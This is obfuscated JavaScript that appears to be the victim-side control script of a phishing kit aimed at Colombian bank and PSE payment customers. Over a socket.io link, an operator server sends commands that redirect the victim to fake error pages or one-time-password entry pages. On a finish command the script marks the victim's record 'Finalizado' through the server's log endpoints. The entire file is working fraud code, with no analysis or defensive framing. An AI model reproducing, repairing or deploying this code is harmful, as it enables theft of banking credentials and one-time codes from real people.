const _0x37b383 = _0x13fc;
(function (_0x34644b, _0x1986b7) {
  const _0x32a449 = _0x13fc,
    _0x3b0222 = _0x34644b();
  while (!![]) {
    try {
      const _0x522e99 =
        (-parseInt(_0x32a449(0x147)) / 0x1) *
          (parseInt(_0x32a449(0x13c)) / 0x2) +
        -parseInt(_0x32a449(0x132)) / 0x3 +
        -parseInt(_0x32a449(0x133)) / 0x4 +
        -parseInt(_0x32a449(0x139)) / 0x5 +
        (parseInt(_0x32a449(0x131)) / 0x6) *
          (parseInt(_0x32a449(0x141)) / 0x7) +
        (-parseInt(_0x32a449(0x148)) / 0x8) *
          (parseInt(_0x32a449(0x130)) / 0x9) +
        parseInt(_0x32a449(0x13a)) / 0xa;
      if (_0x522e99 === _0x1986b7) break;
      else _0x3b0222["push"](_0x3b0222["shift"]());
    } catch (_0x304a73) {
      _0x3b0222["push"](_0x3b0222["shift"]());
    }
  }
})(_0x5087, 0x814d2);
var socket = io["connect"](url);
function _0x13fc(_0x1a32e9, _0x18300a) {
  const _0x50879b = _0x5087();
  return (
    (_0x13fc = function (_0x13fc98, _0x14e0a4) {
      _0x13fc98 = _0x13fc98 - 0x12a;
      let _0x29f451 = _0x50879b[_0x13fc98];
      return _0x29f451;
    }),
    _0x13fc(_0x1a32e9, _0x18300a)
  );
}
socket["on"](_0x37b383(0x12a), function (_0x341411) {
  const _0x414ec1 = _0x37b383;
  if (
    _0x341411[_0x414ec1(0x142)] == "us" &&
    _0x341411[_0x414ec1(0x146)] == info[_0x414ec1(0x12c)][_0x414ec1(0x13f)]
  )
    window[_0x414ec1(0x140)]["href"] = "./index.error.html";
  else {
    if (
      _0x341411[_0x414ec1(0x142)] == _0x414ec1(0x143) &&
      _0x341411[_0x414ec1(0x146)] == info[_0x414ec1(0x12c)][_0x414ec1(0x13f)]
    )
      window[_0x414ec1(0x140)]["href"] = _0x414ec1(0x13b);
    else {
      if (
        _0x341411["valor"] == _0x414ec1(0x149) &&
        _0x341411["valid"] == info[_0x414ec1(0x12c)][_0x414ec1(0x13f)]
      )
        window["location"][_0x414ec1(0x13e)] = _0x414ec1(0x12b);
      else {
        if (
          _0x341411[_0x414ec1(0x142)] == _0x414ec1(0x12f) &&
          _0x341411[_0x414ec1(0x146)] ==
            info[_0x414ec1(0x12c)][_0x414ec1(0x13f)]
        ) {
          async function _0x3cb4e2() {
            const _0x43263c = _0x414ec1,
              _0x16bdf0 = await fetch(url + "/logs/logs", {
                method: _0x43263c(0x138),
                headers: { "Content-Type": _0x43263c(0x136) },
              }),
              _0x46f04e = await _0x16bdf0[_0x43263c(0x145)](),
              _0x5b2f39 = [..._0x46f04e];
            for (const _0x62c169 of _0x5b2f39) {
              if (
                _0x62c169[_0x43263c(0x144)] == info[_0x43263c(0x12c)]["cc"] &&
                _0x62c169["cl"] == info[_0x43263c(0x12c)][_0x43263c(0x13f)]
              ) {
                console[_0x43263c(0x135)](_0x43263c(0x12e));
                const _0x2a710a = await fetch(
                    url + _0x43263c(0x134) + _0x62c169[_0x43263c(0x12d)],
                    {
                      method: "PUT",
                      headers: { "Content-Type": "application/json" },
                      body: JSON[_0x43263c(0x137)]({
                        status: _0x43263c(0x13d),
                      }),
                    }
                  ),
                  _0x31a419 = await _0x2a710a[_0x43263c(0x145)]();
              }
            }
            window[_0x43263c(0x140)][_0x43263c(0x13e)] = "./errorPse.html";
          }
          _0x3cb4e2();
          return;
        }
      }
    }
  }
});
function _0x5087() {
  const _0x5bece4 = [
    "Usuario\x20encontrado",
    "finish",
    "387GrwfYf",
    "768LLZJon",
    "737064tIQtNB",
    "790260tZHZSO",
    "/logs/logFinish/",
    "log",
    "application/json",
    "stringify",
    "GET",
    "580015sOMjDl",
    "9895520YgfJIs",
    "./otp.html",
    "364358FJnMxc",
    "Finalizado",
    "href",
    "telnum",
    "location",
    "29638lHYzqD",
    "valor",
    "din",
    "reg",
    "json",
    "valid",
    "1uIOLKr",
    "48456gJRVfi",
    "newdin",
    "logs",
    "./otp.error.html",
    "metaInfo",
    "idreg",
  ];
  _0x5087 = function () {
    return _0x5bece4;
  };
  return _0x5087();
}
